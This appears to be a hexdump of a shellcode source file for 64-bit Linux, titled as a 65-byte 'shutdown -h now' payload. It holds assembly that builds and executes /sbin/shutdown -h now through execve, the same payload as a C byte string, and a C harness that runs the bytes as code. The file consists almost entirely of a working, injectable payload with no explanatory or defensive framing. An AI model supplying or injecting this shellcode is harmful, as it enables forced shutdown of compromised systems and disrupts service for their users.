00000000  2f 2a 0a 3b 20 54 69 74  6c 65 3a 20 73 68 75 74  |/*.; Title: shut|
00000010  64 6f 77 6e 20 2d 68 20  6e 6f 77 20 78 38 36 5f  |down -h now x86_|
00000020  36 34 20 53 68 65 6c 6c  63 6f 64 65 20 2d 20 36  |64 Shellcode - 6|
00000030  35 20 62 79 74 65 73 0a  3b 20 50 6c 61 74 66 6f  |5 bytes.; Platfo|
00000040  72 6d 3a 20 6c 69 6e 75  78 2f 78 38 36 5f 36 34  |rm: linux/x86_64|
00000050  0a 3b 20 44 61 74 65 3a  20 32 30 31 34 2d 30 36  |.; Date: 2014-06|
00000060  2d 32 37 0a 3b 20 41 75  74 68 6f 72 3a 20 4f 73  |-27.; Author: Os|
00000070  61 6e 64 61 20 4d 61 6c  69 74 68 20 4a 61 79 61  |anda Malith Jaya|
00000080  74 68 69 73 73 61 20 28  40 4f 73 61 6e 64 61 4d  |thissa (@OsandaM|
00000090  61 6c 69 74 68 29 0a 0a  73 65 63 74 69 6f 6e 20  |alith)..section |
000000a0  2e 74 65 78 74 0a 0a 67  6c 6f 62 61 6c 20 5f 73  |.text..global _s|
000000b0  74 61 72 74 0a 0a 5f 73  74 61 72 74 3a 0a 0a 78  |tart.._start:..x|
000000c0  6f 72 20 72 61 78 2c 20  72 61 78 0a 78 6f 72 20  |or rax, rax.xor |
000000d0  72 64 78 2c 20 72 64 78  20 0a 0a 70 75 73 68 20  |rdx, rdx ..push |
000000e0  72 61 78 0a 70 75 73 68  20 62 79 74 65 20 30 78  |rax.push byte 0x|
000000f0  37 37 0a 70 75 73 68 20  77 6f 72 64 20 30 78 36  |77.push word 0x6|
00000100  66 36 65 20 3b 20 6e 6f  77 0a 6d 6f 76 20 72 62  |f6e ; now.mov rb|
00000110  78 2c 20 72 73 70 0a 0a  70 75 73 68 20 72 61 78  |x, rsp..push rax|
00000120  0a 70 75 73 68 20 77 6f  72 64 20 30 78 36 38 32  |.push word 0x682|
00000130  64 20 3b 2d 68 0a 6d 6f  76 20 72 63 78 2c 20 72  |d ;-h.mov rcx, r|
00000140  73 70 0a 0a 70 75 73 68  20 72 61 78 0a 6d 6f 76  |sp..push rax.mov|
00000150  20 72 38 2c 20 30 78 32  66 32 66 32 66 36 65 36  | r8, 0x2f2f2f6e6|
00000160  39 36 32 37 33 32 66 20  3b 20 2f 73 62 69 6e 2f  |962732f ; /sbin/|
00000170  73 68 75 74 64 6f 77 6e  0a 6d 6f 76 20 72 31 30  |shutdown.mov r10|
00000180  2c 20 30 78 36 65 37 37  36 66 36 34 37 34 37 35  |, 0x6e776f647475|
00000190  36 38 37 33 0a 70 75 73  68 20 72 31 30 0a 70 75  |6873.push r10.pu|
000001a0  73 68 20 72 38 0a 6d 6f  76 20 72 64 69 2c 20 72  |sh r8.mov rdi, r|
000001b0  73 70 0a 0a 70 75 73 68  20 72 64 78 0a 70 75 73  |sp..push rdx.pus|
000001c0  68 20 72 62 78 0a 70 75  73 68 20 72 63 78 0a 70  |h rbx.push rcx.p|
000001d0  75 73 68 20 72 64 69 0a  6d 6f 76 20 72 73 69 2c  |ush rdi.mov rsi,|
000001e0  20 72 73 70 0a 0a 61 64  64 20 72 61 78 2c 20 35  | rsp..add rax, 5|
000001f0  39 0a 73 79 73 63 61 6c  6c 0a 0a 2a 2f 0a 0a 23  |9.syscall..*/..#|
00000200  69 6e 63 6c 75 64 65 20  3c 73 74 64 69 6f 2e 68  |include <stdio.h|
00000210  3e 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 72 69  |>.#include <stri|
00000220  6e 67 2e 68 3e 0a 0a 75  6e 73 69 67 6e 65 64 20  |ng.h>..unsigned |
00000230  63 68 61 72 20 63 6f 64  65 5b 5d 20 3d 20 20 22  |char code[] =  "|
00000240  5c 78 34 38 5c 78 33 31  5c 78 63 30 5c 78 34 38  |\x48\x31\xc0\x48|
00000250  5c 78 33 31 5c 78 64 32  5c 78 35 30 5c 78 36 61  |\x31\xd2\x50\x6a|
00000260  22 0a 22 5c 78 37 37 5c  78 36 36 5c 78 36 38 5c  |"."\x77\x66\x68\|
00000270  78 36 65 5c 78 36 66 5c  78 34 38 5c 78 38 39 5c  |x6e\x6f\x48\x89\|
00000280  78 65 33 22 0a 22 5c 78  35 30 5c 78 36 36 5c 78  |xe3"."\x50\x66\x|
00000290  36 38 5c 78 32 64 5c 78  36 38 5c 78 34 38 5c 78  |68\x2d\x68\x48\x|
000002a0  38 39 5c 78 65 31 22 0a  22 5c 78 35 30 5c 78 34  |89\xe1"."\x50\x4|
000002b0  39 5c 78 62 38 5c 78 32  66 5c 78 37 33 5c 78 36  |9\xb8\x2f\x73\x6|
000002c0  32 5c 78 36 39 5c 78 36  65 22 0a 22 5c 78 32 66  |2\x69\x6e"."\x2f|
000002d0  5c 78 32 66 5c 78 32 66  5c 78 34 39 5c 78 62 61  |\x2f\x2f\x49\xba|
000002e0  5c 78 37 33 5c 78 36 38  5c 78 37 35 22 0a 22 5c  |\x73\x68\x75"."\|
000002f0  78 37 34 5c 78 36 34 5c  78 36 66 5c 78 37 37 5c  |x74\x64\x6f\x77\|
00000300  78 36 65 5c 78 34 31 5c  78 35 32 5c 78 34 31 22  |x6e\x41\x52\x41"|
00000310  0a 22 5c 78 35 30 5c 78  34 38 5c 78 38 39 5c 78  |."\x50\x48\x89\x|
00000320  65 37 5c 78 35 32 5c 78  35 33 5c 78 35 31 5c 78  |e7\x52\x53\x51\x|
00000330  35 37 22 0a 22 5c 78 34  38 5c 78 38 39 5c 78 65  |57"."\x48\x89\xe|
00000340  36 5c 78 34 38 5c 78 38  33 5c 78 63 30 5c 78 33  |6\x48\x83\xc0\x3|
00000350  62 5c 78 30 66 22 0a 22  5c 78 30 35 22 3b 0a 0a  |b\x0f"."\x05";..|
00000360  69 6e 74 0a 6d 61 69 6e  28 29 20 7b 0a 0a 70 72  |int.main() {..pr|
00000370  69 6e 74 66 28 22 53 68  65 6c 6c 63 6f 64 65 20  |intf("Shellcode |
00000380  4c 65 6e 67 74 68 3a 20  20 25 64 5c 6e 22 2c 20  |Length:  %d\n", |
00000390  28 69 6e 74 29 73 74 72  6c 65 6e 28 63 6f 64 65  |(int)strlen(code|
000003a0  29 29 3b 0a 69 6e 74 20  28 2a 72 65 74 29 28 29  |));.int (*ret)()|
000003b0  20 3d 20 28 69 6e 74 28  2a 29 28 29 29 63 6f 64  | = (int(*)())cod|
000003c0  65 3b 0a 72 65 74 28 29  3b 0a 0a 72 65 74 75 72  |e;.ret();..retur|
000003d0  6e 20 30 3b 0a 7d                                 |n 0;.}|
000003d6
